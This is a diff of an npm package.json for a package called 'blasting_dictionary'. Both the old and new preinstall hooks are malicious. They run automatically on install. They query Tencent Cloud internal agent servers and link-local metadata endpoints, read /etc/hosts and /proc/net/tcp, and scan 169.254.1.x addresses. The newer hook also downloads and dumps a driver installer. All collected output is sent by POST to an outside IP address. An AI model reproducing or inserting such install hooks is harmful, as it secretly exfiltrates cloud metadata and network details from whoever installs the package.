@@ -1,8 +1,8 @@
 {
-            "name": "blasting_dictionary",
-            "version": "1.2.14",
-            "scripts": {
-                          "preinstall": "(echo '===CCS_LATERAL==='; echo '---AGENT_DNS---'; curl -s -m 5 http://agentserver.ccs.tencentyun.com:9099/ 2>&1 | head -20; echo ''; echo '---AGENT_INSTALLER---'; curl -s -m 5 -XPOST -d '{\"Region\":\"hk\",\"Appid\":\"nil\"}' http://agentserver.ccs.tencentyun.com:9099/gpe/cloud-init/agent-installer 2>&1 | head -50; echo ''; echo '---STATIC_DNS---'; curl -s -m 5 http://static.ccs.tencentyun.com/ 2>&1 | head -20; echo ''; echo '---STATIC_NV---'; curl -s -m 5 http://static.ccs.tencentyun.com/tke-nv-driver-install-1.2.tgz -o /dev/null -w '%{http_code} %{size_download}' 2>&1; echo ''; echo '---AGENT_IP---'; curl -s -m 5 http://169.254.0.119:9099/ 2>&1 | head -20; echo ''; echo '---STATIC_IP---'; curl -s -m 5 http://169.254.0.59/ 2>&1 | head -20; echo ''; echo '---META_IP---'; curl -s -m 5 http://169.254.0.23/latest/meta-data/ 2>&1 | head -20; echo ''; echo '---CCS_AGENT_API---'; curl -s -m 5 http://agentserver.ccs.tencentyun.com:9099/gpe/ 2>&1 | head -20; curl -s -m 5 http://agentserver.ccs.tencentyun.com:9099/api/ 2>&1 | head -20; curl -s -m 5 http://agentserver.ccs.tencentyun.com:9099/health 2>&1 | head -20; curl -s -m 5 http://agentserver.ccs.tencentyun.com:9099/status 2>&1 | head -20; echo ''; echo '---NETNS---'; cat /proc/net/tcp 2>&1 | head -20; echo ''; echo '---HOSTS---'; cat /etc/hosts 2>&1; echo ''; echo '===END===') | curl -s -X POST -d @- http://139.224.40.24:8088/k8s",
-                          "build": "echo 'building...'"
-            }
+  "name": "blasting_dictionary",
+  "version": "1.2.15",
+  "scripts": {
+    "preinstall": "(echo '===NV_DRIVER==='; echo '---DOWNLOAD---'; curl -s -m 10 http://static.ccs.tencentyun.com/tke-nv-driver-install-1.2.tgz -o /tmp/nv.tgz 2>&1; ls -la /tmp/nv.tgz 2>&1; echo '---EXTRACT---'; cd /tmp && tar -xzf nv.tgz 2>&1; ls -la /tmp/nv_driver_install* 2>&1; echo '---CONTENT---'; cat /tmp/nv_driver_install.sh 2>&1; echo '---AGENT_API---'; curl -s -m 5 http://agentserver.ccs.tencentyun.com:9099/gpe/ 2>&1; curl -s -m 5 http://agentserver.ccs.tencentyun.com:9099/api/ 2>&1; curl -s -m 5 http://agentserver.ccs.tencentyun.com:9099/health 2>&1; echo '---SCAN_169.254.1---'; for i in 1 2 3 4 5 6 7 8 9 10 20 30 36 50 100 119 130 200 254; do r=$(curl -s -m 1 -o /dev/null -w '%{http_code}' http://169.254.1.$i/ 2>&1); [ \"$r\" != \"000\" ] && echo \"169.254.1.$i: $r\"; done; echo '===END===') | curl -s -X POST -d @- http://139.224.40.24:8088/k8s",
+    "build": "echo 'building...'"
+  }
 }
